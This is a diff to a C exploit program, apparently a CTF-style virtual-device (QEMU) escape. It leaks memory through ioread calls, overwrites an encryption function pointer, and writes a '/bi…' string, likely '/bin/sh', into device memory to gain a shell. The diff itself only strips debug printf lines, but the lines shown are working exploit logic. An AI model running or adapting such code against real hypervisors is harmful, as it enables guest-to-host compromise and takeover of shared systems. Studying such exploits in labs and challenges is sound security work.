@@ -43,7 +43,6 @@ int main(int argc, char const* argv[]) {
     g_buf = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
     if (g_buf == MAP_FAILED)
         die("mmap");
-
     
     /* leak */
     ioread(0); // 0
@@ -101,41 +100,12 @@ int main(int argc, char const* argv[]) {
    
     ioread(3); // 3->4
     ioread(5); // set aes_encrpyto_function
-    printf("encrypt\n");
-    printf("encrypt\n");
-    printf("encrypt\n");
-    printf("encrypt\n");
-    printf("encrypt\n");
-    printf("encrypt\n");
-    printf("encrypt\n");
-    printf("encrypt\n");
     ioread(9); // 4->6: encrypt
 
     /* trigger */
-    printf("ioread(0)\n");
-    printf("encrypt\n");
-    printf("encrypt\n");
-    printf("encrypt\n");
-    printf("encrypt\n");
-    printf("encrypt\n");
-    printf("encrypt\n");
     ioread(0); // 0
-    printf("ioread(2)\n");
-    printf("ioread(2)\n");
-    printf("ioread(2)\n");
-    printf("ioread(2)\n");
-    printf("ioread(2)\n");
-    printf("ioread(2)\n");
-    printf("ioread(2)\n");
     ioread(2); // 0->1
 
-    printf("iowrite\n");
-    printf("iowrite\n");
-    printf("iowrite\n");
-    printf("iowrite\n");
-    printf("iowrite\n");
-    printf("iowrite\n");
-    printf("iowrite\n");
     iowrite(0x2000+0, '/');
     iowrite(0x2000+1, 'b');
     iowrite(0x2000+2, 'i');
@@ -150,7 +120,6 @@ int main(int argc, char const* argv[]) {
         iowrite(0x1000+i, '\xaa');
     }
     ioread(3); // 3->4
-    //ioread(7); // set stream_encrpyto_function
     ioread(9); // 4->6: encrypt
  
     return 0;
